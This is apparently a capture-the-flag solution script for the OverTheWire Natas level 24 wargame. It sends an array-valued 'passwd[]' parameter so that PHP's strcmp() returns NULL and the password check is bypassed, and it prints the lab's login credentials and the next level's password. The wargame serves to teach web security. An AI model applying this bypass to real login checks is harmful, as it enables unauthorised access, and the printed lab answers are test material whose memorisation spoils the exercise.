from bs4 import BeautifulSoup
import requests

def make():
    res = requests.get(url=url,auth=lvl_pass, params=my_params, cookies=my_cookies)
    soup = BeautifulSoup(res.text, 'html.parser')
    return (res, soup)
    
def writeResponse(enumerate = ''):
    with open(f'./response{enumerate}.html', 'w') as browserFile:
        browserFile.write(soup.prettify())
        

url = 'http://natas24.natas.labs.overthewire.org'
lvl_pass = requests.auth.HTTPBasicAuth('natas24','0xzF30T9Av8lgXhW7slhFCIsVKAPyl2r')
my_cookies = {"PHPSESSID":''} #irrelevant for this one 
my_params = {"passwd[]":'not sure'}

res, soup = make()
writeResponse()

'''
Another type conversion lesson. 0, 0.0, "0", and NULL auto cast to false.
And passing an array into strcmp() returns NULL in PHP.

Username: natas25 
Password: O9QD9DZBDq1YpswiTM5oqMDaOtuZtAcx
'''
